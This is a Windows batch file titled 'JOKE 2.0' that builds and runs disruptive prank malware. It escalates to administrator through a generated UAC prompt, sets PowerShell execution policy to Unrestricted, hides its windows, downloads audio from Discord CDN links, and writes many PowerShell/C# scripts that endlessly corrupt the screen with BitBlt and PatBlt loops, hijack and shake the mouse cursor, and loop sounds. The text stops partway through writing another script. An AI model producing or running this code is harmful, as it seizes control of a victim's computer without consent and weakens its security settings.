@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /b

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
@echo off
cls
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c
PowerShell.exe -NoProfile -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser"


cd %appdata%
md %appdata%\ren\
del /s /q %appdata%\ren\*.*
cd %appdata%\ren\
powershell -Command "Invoke-Webrequest" "https://cdn.discordapp.com/attachments/1049686998044135506/1124227011196489798/1.mp3" -outfile "sound.mp3"
powershell -Command "Invoke-Webrequest" "https://cdn.discordapp.com/attachments/1049686998044135506/1124227524583505981/2f.mp3" -outfile "sound2.mp3"


echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                                             > song.ps1                                 
echo $form = New-Object System.Windows.Forms.Form                                                                            >> song.ps1
echo $form.WindowState = 'Maximized'                                                                                         >> song.ps1
echo $form.FormBorderStyle = 'None'                                                                                          >> song.ps1
echo $form.BackColor = 'Transparent'                                                                                         >> song.ps1
echo $form.Opacity = 0                                                                                                       >> song.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                              >> song.ps1
echo $mediaPlayer.Open("$env:appdata\ren\sound2.mp3")                                                                         >> song.ps1
echo $mediaPlayer.Play()                                                                                                     >> song.ps1
echo $host = New-Object WindowsFormsHost                                                                                     >> song.ps1
echo $host.Dock = 'Fill'                                                                                                     >> song.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                         >> song.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                     >> song.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                       >> song.ps1
echo $host.Child = $mediaElement                                                                                             >> song.ps1
echo $form.Controls.Add($host)                                                                                               >> song.ps1
echo $null = $form.ShowDialog()                                                                                              >> song.ps1
echo while ($true) {                                                                                                         >> song.ps1             
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {          >> song.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                                  >> song.ps1
echo         $mediaPlayer.Play()                                                                                             >> song.ps1
echo     }                                                                                                                   >> song.ps1
echo }                                                                                                                       >> song.ps1


echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                                          >> benben.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                         >> benben.ps1
echo $form.WindowState = 'Maximized'                                                                                      >> benben.ps1
echo $form.FormBorderStyle = 'None'                                                                                       >> benben.ps1
echo $form.BackColor = 'Transparent'                                                                                      >> benben.ps1
echo $form.Opacity = 0                                                                                                    >> benben.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                           >> benben.ps1
echo $mediaPlayer.Open("$env:appdata\ren\sound.mp3")                                                                     >> benben.ps1
echo $mediaPlayer.Play()                                                                                                  >> benben.ps1
echo $host = New-Object WindowsFormsHost                                                                                  >> benben.ps1
echo $host.Dock = 'Fill'                                                                                                  >> benben.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                      >> benben.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                  >> benben.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                    >> benben.ps1
echo $host.Child = $mediaElement                                                                                          >> benben.ps1
echo $form.Controls.Add($host)                                                                                            >> benben.ps1
echo $null = $form.ShowDialog()                                                                                           >> benben.ps1
echo while ($true) {                                                                                                      >> benben.ps1                
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {       >> benben.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                               >> benben.ps1
echo         $mediaPlayer.Play()                                                                                          >> benben.ps1
echo     }                                                                                                                >> benben.ps1
echo }                                                                                                                    >> benben.ps1

powershell -Command "[reflection.assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null;$notify = new-object system.windows.forms.notifyicon;$notify.icon = [System.Drawing.SystemIcons]::Information;$notify.visible = $true;$notify.showballoontip(0, 'JOKE 2.0 -SNAKE0071-', 'Thanks for running JOKE 2.0 batch file :) After 10 seconds the program is running!', [System.Windows.Forms.TooltipIcon]::None)"
echo Add-Type -TypeDefinition @^"                                                                              > mouseicon.ps1
echo using System;                                                                                             >> mouseicon.ps1
echo using System.Runtime.InteropServices;                                                                     >> mouseicon.ps1
echo public class ErrorIconEffect                                                                              >> mouseicon.ps1
echo {                                                                                                         >> mouseicon.ps1
echo     [DllImport("user32.dll")]                                                                             >> mouseicon.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                       >> mouseicon.ps1
echo     [DllImport("user32.dll")]                                                                             >> mouseicon.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                          >> mouseicon.ps1
echo     [DllImport("gdi32.dll")]                                                                              >> mouseicon.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,     >> mouseicon.ps1
echo         IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);                                                 >> mouseicon.ps1
echo     [DllImport("user32.dll")]                                                                             >> mouseicon.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                >> mouseicon.ps1
echo     [DllImport("user32.dll")]                                                                             >> mouseicon.ps1
echo     public static extern bool GetCursorPos(out POINT lpPoint);                                            >> mouseicon.ps1
echo     [StructLayout(LayoutKind.Sequential)]                                                                 >> mouseicon.ps1
echo     public struct POINT                                                                                   >> mouseicon.ps1
echo     {                                                                                                     >> mouseicon.ps1
echo         public int X;                                                                                     >> mouseicon.ps1
echo         public int Y;                                                                                     >> mouseicon.ps1
echo     }                                                                                                     >> mouseicon.ps1
echo     public static void RunErrorIconEffect()                                                               >> mouseicon.ps1
echo     {                                                                                                     >> mouseicon.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                  >> mouseicon.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                            >> mouseicon.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                           >> mouseicon.ps1
echo         int iconWidth = 50;                                                                               >> mouseicon.ps1
echo         int iconHeight = 50;                                                                              >> mouseicon.ps1
echo         int errorIconX = 0, errorIconY = 0;                                                               >> mouseicon.ps1
echo         while (true)                                                                                      >> mouseicon.ps1
echo         {                                                                                                 >> mouseicon.ps1
echo             POINT cursorPos;                                                                              >> mouseicon.ps1
echo             GetCursorPos(out cursorPos);                                                                  >> mouseicon.ps1
echo             errorIconX = cursorPos.X - (iconWidth / 2);                                                   >> mouseicon.ps1
echo             errorIconY = cursorPos.Y - (iconHeight / 2);                                                  >> mouseicon.ps1
echo             BitBlt(hdc, errorIconX, errorIconY, iconWidth, iconHeight, hdc, 0, 0, 0x00B8074A);            >> mouseicon.ps1
echo             System.Threading.Thread.Sleep(10);                                                            >> mouseicon.ps1
echo         }                                                                                                 >> mouseicon.ps1
echo     }                                                                                                     >> mouseicon.ps1
echo }                                                                                                         >> mouseicon.ps1
echo ^"@                                                                                                       >> mouseicon.ps1
echo [ErrorIconEffect]::RunErrorIconEffect()                                                                   >> mouseicon.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                     > fastup.ps1
echo using System;                                                                                                                                                   >> fastup.ps1
echo using System.Drawing;                                                                                                                                           >> fastup.ps1
echo using System.Runtime.InteropServices;                                                                                                                           >> fastup.ps1
echo using System.Threading;                                                                                                                                         >> fastup.ps1
echo public class GraphicsHelper                                                                                                                                     >> fastup.ps1
echo {                                                                                                                                                               >> fastup.ps1
echo     [DllImport("user32.dll")]                                                                                                                                   >> fastup.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                                             >> fastup.ps1
echo     [DllImport("user32.dll")]                                                                                                                                   >> fastup.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                                                >> fastup.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                    >> fastup.ps1
echo     public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, uint dwRop);  >> fastup.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                    >> fastup.ps1
echo     public static extern IntPtr CreateCompatibleDC(IntPtr hdc);                                                                                                 >> fastup.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                    >> fastup.ps1
echo     public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);                                                                    >> fastup.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                    >> fastup.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);                                                                                       >> fastup.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                    >> fastup.ps1
echo     public static extern bool DeleteObject(IntPtr hObject);                                                                                                     >> fastup.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                    >> fastup.ps1
echo     public static extern bool DeleteDC(IntPtr hdc);                                                                                                             >> fastup.ps1
echo     [DllImport("user32.dll")]                                                                                                                                   >> fastup.ps1
echo     public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);                                                                                      >> fastup.ps1
echo     [DllImport("user32.dll")]                                                                                                                                   >> fastup.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                                             >> fastup.ps1
echo     public const uint SRCCOPY = 0x00CC0020;                                                                                                                     >> fastup.ps1
echo     public static void ManipulateGraphics(int repeatCount)                                                                                                      >> fastup.ps1
echo     {                                                                                                                                                           >> fastup.ps1
echo         IntPtr hdcSource = GetDC(IntPtr.Zero);                                                                                                                  >> fastup.ps1
echo         IntPtr hdcDest = CreateCompatibleDC(hdcSource);                                                                                                         >> fastup.ps1
echo         RECT rect;                                                                                                                                              >> fastup.ps1
echo         GetWindowRect(GetDesktopWindow(), out rect);                                                                                                            >> fastup.ps1
echo         int width = rect.Right - rect.Left;                                                                                                                     >> fastup.ps1
echo         int height = rect.Bottom - rect.Top;                                                                                                                    >> fastup.ps1
echo         int step = 7;                                                                                                                                           >> fastup.ps1
echo         int delay = 0;                                                                                                                                          >> fastup.ps1
echo         IntPtr hBitmap = IntPtr.Zero;                                                                                                                           >> fastup.ps1
echo         IntPtr hOldBitmap = IntPtr.Zero;                                                                                                                        >> fastup.ps1
echo         try                                                                                                                                                     >> fastup.ps1
echo         {                                                                                                                                                       >> fastup.ps1
echo             hBitmap = IntPtr.Zero;                                                                                                                              >> fastup.ps1
echo             hBitmap = CreateCompatibleBitmap(hdcSource, width, height);                                                                                         >> fastup.ps1
echo             hOldBitmap = SelectObject(hdcDest, hBitmap);                                                                                                        >> fastup.ps1
echo             for (int repeat = 0; repeat ^< repeatCount; repeat++)                                                                                                >> fastup.ps1
echo             {                                                                                                                                                   >> fastup.ps1
echo                 for (int i = 0; i ^< width ^/ 2; i += step)                                                                                                       >> fastup.ps1
echo                 {                                                                                                                                               >> fastup.ps1
echo                     int xDest = rect.Left - i;                                                                                                                  >> fastup.ps1
echo                     int yDest = rect.Top - i;                                                                                                                   >> fastup.ps1
echo                     int copyWidth = width - 2 ^* i;                                                                                                              >> fastup.ps1
echo                     int copyHeight = height - 2 ^* i;                                                                                                            >> fastup.ps1
echo                     BitBlt(hdcDest, xDest, yDest, copyWidth, copyHeight, hdcSource, xDest + step, yDest + step, SRCCOPY);                                       >> fastup.ps1
echo                     BitBlt(hdcSource, 0, 0, width, height, hdcDest, 0, 0, SRCCOPY);                                                                             >> fastup.ps1
echo                     Thread.Sleep(delay);                                                                                                                        >> fastup.ps1
echo                 }                                                                                                                                               >> fastup.ps1
echo             }                                                                                                                                                   >> fastup.ps1
echo         }                                                                                                                                                       >> fastup.ps1
echo         finally                                                                                                                                                 >> fastup.ps1
echo         {                                                                                                                                                       >> fastup.ps1
echo             if (hBitmap ^!= IntPtr.Zero)                                                                                                                         >> fastup.ps1
echo             {                                                                                                                                                   >> fastup.ps1
echo                 SelectObject(hdcDest, hOldBitmap);                                                                                                              >> fastup.ps1
echo                 DeleteObject(hBitmap);                                                                                                                          >> fastup.ps1
echo             }                                                                                                                                                   >> fastup.ps1
echo             DeleteDC(hdcDest);                                                                                                                                  >> fastup.ps1
echo             ReleaseDC(IntPtr.Zero, hdcSource);                                                                                                                  >> fastup.ps1
echo         }                                                                                                                                                       >> fastup.ps1
echo     }                                                                                                                                                           >> fastup.ps1
echo }                                                                                                                                                               >> fastup.ps1
echo public struct RECT                                                                                                                                              >> fastup.ps1
echo {                                                                                                                                                               >> fastup.ps1
echo     public int Left;                                                                                                                                            >> fastup.ps1
echo     public int Top;                                                                                                                                             >> fastup.ps1
echo     public int Right;                                                                                                                                           >> fastup.ps1
echo     public int Bottom;                                                                                                                                          >> fastup.ps1
echo }                                                                                                                                                               >> fastup.ps1
echo ^"@                                                                                                                                                              >> fastup.ps1
echo [GraphicsHelper]::ManipulateGraphics(545325)                                                                                                                    >> fastup.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                 > scopy.ps1
echo using System;                                                                                                                                                >> scopy.ps1
echo using System.Runtime.InteropServices;                                                                                                                        >> scopy.ps1
echo public class GraphicsHelper                                                                                                                                  >> scopy.ps1
echo {                                                                                                                                                            >> scopy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                >> scopy.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                          >> scopy.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                 >> scopy.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);      >> scopy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                >> scopy.ps1
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                                  >> scopy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                >> scopy.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                             >> scopy.ps1
echo     public static void GraphicsEffect()                                                                                                                      >> scopy.ps1
echo     {                                                                                                                                                        >> scopy.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                     >> scopy.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                               >> scopy.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                              >> scopy.ps1
echo         Random random = new Random();                                                                                                                        >> scopy.ps1
echo         while (true)                                                                                                                                         >> scopy.ps1
echo         {                                                                                                                                                    >> scopy.ps1
echo             BitBlt(hdc, random.Next(100), random.Next(10), screenWidth, screenHeight, hdc, 0, 10, 0xCC0020);                                                 >> scopy.ps1
echo             BitBlt(hdc, random.Next(100), random.Next(10), screenWidth, screenHeight, hdc, 10, 0, 0xEE0086);                                                 >> scopy.ps1
echo             BitBlt(hdc, random.Next(30), random.Next(70), screenWidth, screenHeight, hdc, 100, 0, 0x660046);     >> scopy.ps1
echo         }                                                                                                                                                    >> scopy.ps1
echo     }                                                                                                                                                        >> scopy.ps1
echo }                                                                                                                                                            >> scopy.ps1
echo ^"@                                                                                                                                                          >> scopy.ps1
echo [GraphicsHelper]::GraphicsEffect()                                                                                                                           >> scopy.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                              > melting.ps1 
echo using System;                                                                                                                                             >> melting.ps1
echo using System.Runtime.InteropServices;                                                                                                                     >> melting.ps1
echo public class GraphicsHelper                                                                                                                               >> melting.ps1
echo {                                                                                                                                                         >> melting.ps1
echo     [DllImport("user32.dll")]                                                                                                                             >> melting.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                       >> melting.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                              >> melting.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);   >> melting.ps1
echo     [DllImport("user32.dll")]                                                                                                                             >> melting.ps1
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                               >> melting.ps1
echo     [DllImport("user32.dll")]                                                                                                                             >> melting.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                          >> melting.ps1
echo     public static void RandomSlideGraphicsEffect()                                                                                                        >> melting.ps1
echo     {                                                                                                                                                     >> melting.ps1
echo         while (true)                                                                                                                                      >> melting.ps1
echo         {                                                                                                                                                 >> melting.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                              >> melting.ps1
echo             int screenWidth = GetSystemMetrics(0);                                                                                                        >> melting.ps1
echo             int screenHeight = GetSystemMetrics(1);                                                                                                       >> melting.ps1
echo             int randomX = new Random().Next() %% screenWidth;                                                                                              >> melting.ps1
echo             BitBlt(hdc, randomX, 10, 100, screenHeight, hdc, randomX, 0, 0xCC0020);                                                                       >> melting.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                  >> melting.ps1
echo         }                                                                                                                                                 >> melting.ps1
echo     }                                                                                                                                                     >> melting.ps1
echo }                                                                                                                                                         >> melting.ps1
echo ^"@                                                                                                                                                       >> melting.ps1
echo [GraphicsHelper]::RandomSlideGraphicsEffect()                                                                                                             >> melting.ps1

echo Add-Type -TypeDefinition @^"                                                           > MOUSEMOVE.ps1
echo using System;                                                                          >> MOUSEMOVE.ps1
echo using System.Runtime.InteropServices;                                                  >> MOUSEMOVE.ps1
echo public class MouseShaker                                                               >> MOUSEMOVE.ps1
echo {                                                                                      >> MOUSEMOVE.ps1
echo     [DllImport("user32.dll")]                                                          >> MOUSEMOVE.ps1
echo     public static extern bool GetCursorPos(out POINT lpPoint);                         >> MOUSEMOVE.ps1
echo     [DllImport("user32.dll")]                                                          >> MOUSEMOVE.ps1
echo     public static extern bool SetCursorPos(int x, int y);                              >> MOUSEMOVE.ps1
echo     [StructLayout(LayoutKind.Sequential)]                                              >> MOUSEMOVE.ps1
echo     public struct POINT                                                                >> MOUSEMOVE.ps1
echo     {                                                                                  >> MOUSEMOVE.ps1
echo         public int X;                                                                  >> MOUSEMOVE.ps1
echo         public int Y;                                                                  >> MOUSEMOVE.ps1
echo     }                                                                                  >> MOUSEMOVE.ps1
echo     public static void ShakeMouse(int duration, int shakeAmount)                       >> MOUSEMOVE.ps1
echo     {                                                                                  >> MOUSEMOVE.ps1
echo         Random random = new Random();                                                  >> MOUSEMOVE.ps1
echo         POINT originalPos;                                                             >> MOUSEMOVE.ps1
echo         GetCursorPos(out originalPos);                                                 >> MOUSEMOVE.ps1
echo         DateTime endTime = DateTime.Now.AddMilliseconds(duration);                     >> MOUSEMOVE.ps1
echo         while (DateTime.Now ^< endTime)                                                >> MOUSEMOVE.ps1
echo         {                                                                              >> MOUSEMOVE.ps1
echo             int newX = originalPos.X + random.Next(-shakeAmount, shakeAmount);         >> MOUSEMOVE.ps1
echo             int newY = originalPos.Y + random.Next(-shakeAmount, shakeAmount);         >> MOUSEMOVE.ps1
echo             SetCursorPos(newX, newY);                                                  >> MOUSEMOVE.ps1
echo         }                                                                              >> MOUSEMOVE.ps1
echo         SetCursorPos(originalPos.X, originalPos.Y);                                    >> MOUSEMOVE.ps1
echo     }                                                                                  >> MOUSEMOVE.ps1
echo }                                                                                      >> MOUSEMOVE.ps1
echo ^"@                                                                                    >> MOUSEMOVE.ps1
echo [MouseShaker]::ShakeMouse(500, 1)                                                      >> MOUSEMOVE.ps1
echo [MouseShaker]::ShakeMouse(500, 5)                                                      >> MOUSEMOVE.ps1
echo [MouseShaker]::ShakeMouse(5000, 10)                                                    >> MOUSEMOVE.ps1
echo [MouseShaker]::ShakeMouse(500, 20)                                                     >> MOUSEMOVE.ps1
echo [MouseShaker]::ShakeMouse(5000, 30)                                                    >> MOUSEMOVE.ps1
echo [MouseShaker]::ShakeMouse(5000, 60)                                                    >> MOUSEMOVE.ps1
echo [MouseShaker]::ShakeMouse(5000, 120)                                                   >> MOUSEMOVE.ps1
echo [MouseShaker]::ShakeMouse(5000, 1200)                                                  >> MOUSEMOVE.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                   > veryscopy.ps1
echo using System;                                                                                                                                                  >> veryscopy.ps1
echo using System.Runtime.InteropServices;                                                                                                                          >> veryscopy.ps1
echo public class GraphicsHelper                                                                                                                                    >> veryscopy.ps1
echo {                                                                                                                                                              >> veryscopy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> veryscopy.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                            >> veryscopy.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> veryscopy.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);        >> veryscopy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> veryscopy.ps1
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                                    >> veryscopy.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> veryscopy.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                               >> veryscopy.ps1
echo     public static void GraphicsEffect()                                                                                                                        >> veryscopy.ps1
echo     {                                                                                                                                                          >> veryscopy.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                       >> veryscopy.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                                 >> veryscopy.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                                >> veryscopy.ps1
echo         Random random = new Random();                                                                                                                          >> veryscopy.ps1
echo         while (true)                                                                                                                                           >> veryscopy.ps1
echo         {                                                                                                                                                      >> veryscopy.ps1
echo             BitBlt(hdc, random.Next(10), random.Next(30), screenWidth, screenHeight, hdc, 4, 0, 0xCC0020);                                                     >> veryscopy.ps1
echo             BitBlt(hdc, random.Next(10), random.Next(30), screenWidth, screenHeight, hdc, 4, 0, 0xEE0086);                                                     >> veryscopy.ps1
echo             BitBlt(hdc, random.Next(10), random.Next(30), screenWidth, screenHeight, hdc, 4, 4, 0x660046);                                                     >> veryscopy.ps1
echo         }                                                                                                                                                      >> veryscopy.ps1
echo     }                                                                                                                                                          >> veryscopy.ps1
echo }                                                                                                                                                              >> veryscopy.ps1
echo ^"@                                                                                                                                                            >> veryscopy.ps1
echo [GraphicsHelper]::GraphicsEffect()                                                                                                                             >> veryscopy.ps1

echo Add-Type -TypeDefinition @^"                                                                                          > verysh.ps1
echo using System;                                                                                                         >> verysh.ps1
echo using System.Runtime.InteropServices;                                                                                 >> verysh.ps1
echo public class Program                                                                                                  >> verysh.ps1
echo {                                                                                                                     >> verysh.ps1
echo     [DllImport("user32.dll")]                                                                                         >> verysh.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                   >> verysh.ps1
echo     [DllImport("user32.dll")]                                                                                         >> verysh.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                      >> verysh.ps1
echo     [DllImport("gdi32.dll")]                                                                                          >> verysh.ps1
echo     public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);        >> verysh.ps1
echo     [DllImport("user32.dll")]                                                                                         >> verysh.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                            >> verysh.ps1
echo     public static void Main()                                                                                         >> verysh.ps1
echo     {                                                                                                                 >> verysh.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                              >> verysh.ps1
echo         int x = GetSystemMetrics(0);                                                                                  >> verysh.ps1
echo         int y = GetSystemMetrics(1);                                                                                  >> verysh.ps1
echo         while (true)                                                                                                  >> verysh.ps1
echo         {                                                                                                             >> verysh.ps1
echo             hdc = GetDC(IntPtr.Zero);                                                                                 >> verysh.ps1
echo             PatBlt(hdc, 0, 0, x, y, 0x005A0049);                                                                      >> verysh.ps1
echo             System.Threading.Thread.Sleep(1);                                                                         >> verysh.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                              >> verysh.ps1
echo         }                                                                                                             >> verysh.ps1
echo     }                                                                                                                 >> verysh.ps1
echo }                                                                                                                     >> verysh.ps1
echo ^"@                                                                                                                   >> verysh.ps1
echo [Program]::Main()                                                                                                     >> verysh.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                 > graficdest2.ps1                                                                                                            
echo using System;                                                                                                                                                >> graficdest2.ps1
echo using System.Runtime.InteropServices;                                                                                                                        >> graficdest2.ps1
echo public class BitBltEffect                                                                                                                                    >> graficdest2.ps1
echo {                                                                                                                                                            >> graficdest2.ps1
echo     [DllImport("user32.dll")]                                                                                                                                >> graficdest2.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                                          >> graficdest2.ps1
echo     [DllImport("user32.dll")]                                                                                                                                >> graficdest2.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                                             >> graficdest2.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                 >> graficdest2.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);      >> graficdest2.ps1
echo     [DllImport("user32.dll")]                                                                                                                                >> graficdest2.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                   >> graficdest2.ps1
echo     public static void RunBitBltEffect()                                                                                                                     >> graficdest2.ps1
echo     {                                                                                                                                                        >> graficdest2.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                     >> graficdest2.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                               >> graficdest2.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                              >> graficdest2.ps1
echo         Random random = new Random();                                                                                                                        >> graficdest2.ps1
echo         while (true)                                                                                                                                         >> graficdest2.ps1
echo         {                                                                                                                                                    >> graficdest2.ps1
echo            BitBlt(hdc, random.Next(10), random.Next(10), screenWidth, screenHeight, hdc, random.Next(100), random.Next(100), 0x001100A6);                 >> graficdest2.ps1
echo         }                                                                                                                                                    >> graficdest2.ps1
echo     }                                                                                                                                                        >> graficdest2.ps1
echo }                                                                                                                                                            >> graficdest2.ps1
echo ^"@                                                                                                                                                          >> graficdest2.ps1
echo [BitBltEffect]::RunBitBltEffect()                                                                                                                            >> graficdest2.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                  > fastleft.ps1
echo using System;                                                                                                                                                 >> fastleft.ps1
echo using System.Runtime.InteropServices;                                                                                                                         >> fastleft.ps1
echo public class ScreenEffect                                                                                                                                     >> fastleft.ps1
echo {                                                                                                                                                             >> fastleft.ps1
echo     [DllImport("user32.dll")]                                                                                                                                 >> fastleft.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                                           >> fastleft.ps1
echo     [DllImport("user32.dll")]                                                                                                                                 >> fastleft.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                                              >> fastleft.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                  >> fastleft.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);       >> fastleft.ps1
echo     [DllImport("user32.dll")]                                                                                                                                 >> fastleft.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                    >> fastleft.ps1
echo     public static void RunScreenEffect()                                                                                                                      >> fastleft.ps1
echo     {                                                                                                                                                         >> fastleft.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                      >> fastleft.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                                >> fastleft.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                               >> fastleft.ps1
echo         int xOffset = 0;                                                                                                                                      >> fastleft.ps1
echo         int stepSize = 5;                                                                                                                                     >> fastleft.ps1
echo         while (true)                                                                                                                                          >> fastleft.ps1
echo         {                                                                                                                                                     >> fastleft.ps1
echo             BitBlt(hdc, 0, 0, screenWidth, screenHeight, hdc, xOffset, 0, 0x00CC0020);                                                                        >> fastleft.ps1
echo             xOffset += stepSize;                                                                                                                              >> fastleft.ps1
echo             if (xOffset ^>= screenWidth)                                                                                                                      >> fastleft.ps1
echo                 xOffset = 0;                                                                                                                                  >> fastleft.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                                >> fastleft.ps1
echo         }                                                                                                                                                     >> fastleft.ps1
echo     }                                                                                                                                                         >> fastleft.ps1
echo }                                                                                                                                                             >> fastleft.ps1
echo ^"@                                                                                                                                                           >> fastleft.ps1
echo [ScreenEffect]::RunScreenEffect()                                                                                                                             >> fastleft.ps1

echo Add-Type -TypeDefinition @^" > 2b.ps1
echo using System; >> 2b.ps1
echo using System.Runtime.InteropServices; >> 2b.ps1
echo public class GraphicsHelper >> 2b.ps1
echo { >> 2b.ps1
echo     [DllImport("user32.dll")] >> 2b.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd); >> 2b.ps1
echo     [DllImport("gdi32.dll")] >> 2b.ps1
echo     public static extern IntPtr CreateSolidBrush(uint crColor); >> 2b.ps1
